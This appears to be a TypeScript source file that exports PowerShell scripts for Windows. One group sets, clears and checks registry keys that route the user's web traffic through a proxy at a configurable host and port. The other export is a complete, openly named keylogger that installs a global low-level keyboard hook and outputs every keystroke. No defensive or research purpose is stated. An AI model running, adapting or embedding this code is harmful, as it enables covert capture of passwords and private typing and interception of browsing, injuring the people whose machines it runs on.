export const PROXY_SCRIPTS = (
  port: number,
  host: string = process.env["PROXY_HOST"] || "127.0.0.1",
) => ({
  SET_PROXY_SETTINGS: `$regKey = "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings"
New-ItemProperty -Path $regKey -Name ProxyEnable -Value 1 -PropertyType DWord -Force | Out-Null
New-ItemProperty -Path $regKey -Name ProxyServer -Value "${host}:${port}" -PropertyType String -Force | Out-Null
New-ItemProperty -Path $regKey -Name ProxyOverride -Value "localhost;127.0.0.1;<local>" -PropertyType String -Force | Out-Null`,

  UNSET_PROXY_SETTINGS: `$regKey = "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings"
New-ItemProperty -Path $regKey -Name ProxyEnable -Value 0 -PropertyType DWord -Force | Out-Null
New-ItemProperty -Path $regKey -Name ProxyServer -Value "" -PropertyType String -Force | Out-Null
New-ItemProperty -Path $regKey -Name ProxyOverride -Value "" -PropertyType String -Force | Out-Null`,

  IS_PROXY_CONNECTED: `$proxyStatus = Get-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings"
if ($proxyStatus.ProxyEnable -eq 1 -and $proxyStatus.ProxyServer -eq "${host}:${port}") {
    Write-Output "true"
} else {
    Write-Output "false"
}`,
});

export const SET_KEYLOGGER_SCRIPT = `
Add-Type -TypeDefinition @'
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.Text;
using System.IO;

public class KeyLogger {
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
    
    private static LowLevelKeyboardProc _proc = HookCallback;
    private static IntPtr _hookID = IntPtr.Zero;
    private static string logFilePath = "C:\\\\temp\\\\keylog.txt";
    
    public static void Start() {
        try {
            _hookID = SetHook(_proc);
            Application.Run();
        } catch (Exception ex) {
            File.AppendAllText(logFilePath, "Error: " + ex.Message + "\\n");
        }
    }

    public static void Stop() {
        try {
            if (_hookID != IntPtr.Zero) {
                UnhookWindowsHookEx(_hookID);
                _hookID = IntPtr.Zero;
            }
            Application.Exit();
            Environment.Exit(0); 
        } catch (Exception ex) {
            File.AppendAllText(logFilePath, "Error: " + ex.Message + "\\n");
        }
    }
    
    private static IntPtr SetHook(LowLevelKeyboardProc proc) {
        using (Process curProcess = Process.GetCurrentProcess())
        using (ProcessModule curModule = curProcess.MainModule) {
            return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                GetModuleHandle(curModule.ModuleName), 0);
        }
    }
    
    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
    
    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
            int vkCode = Marshal.ReadInt32(lParam);
            byte[] keyboardState = new byte[256];
            GetKeyboardState(keyboardState);
            uint scanCode = MapVirtualKey((uint)vkCode, 0);
            IntPtr activeWindow = GetForegroundWindow();
            uint threadId = GetWindowThreadProcessId(activeWindow, IntPtr.Zero);
            IntPtr hkl = GetKeyboardLayout(threadId);
            StringBuilder sb = new StringBuilder(10);
            int rc = ToUnicodeEx((uint)vkCode, scanCode, keyboardState, sb, sb.Capacity, 0, hkl);
            if (rc > 0) {
                Console.Write(sb.ToString());
            } else {
                Console.Write(string.Format("[{0}]", (Keys)vkCode));
            }
        }
        return CallNextHookEx(_hookID, nCode, wParam, lParam);
    }
    
    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
    
    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);
    
    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
    
    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);
    
    [DllImport("user32.dll")]
    static extern bool GetKeyboardState(byte[] lpKeyState);
    
    [DllImport("user32.dll")]
    static extern uint MapVirtualKey(uint uCode, uint uMapType);
    
    [DllImport("user32.dll")]
    static extern IntPtr GetForegroundWindow();
    
    [DllImport("user32.dll")]
    static extern uint GetWindowThreadProcessId(IntPtr hWnd, IntPtr ProcessId);
    
    [DllImport("user32.dll")]
    static extern IntPtr GetKeyboardLayout(uint idThread);
    
    [DllImport("user32.dll")]
    static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);
}
'@ -ReferencedAssemblies System.Windows.Forms,System.Drawing

Register-EngineEvent -SourceIdentifier PowerShell.Exiting -Action {
    [KeyLogger]::Stop()
    [System.Environment]::Exit(0)
}

# Start the keylogger
[KeyLogger]::Start()
`;

export const SCRIPTS = {
  WINDOWS: {
    SET_PROXY: PROXY_SCRIPTS,
    UNSET_PROXY: PROXY_SCRIPTS,
    IS_PROXY_CONNECTED: PROXY_SCRIPTS,
    SET_KEYLOGGER: SET_KEYLOGGER_SCRIPT,
  },
};
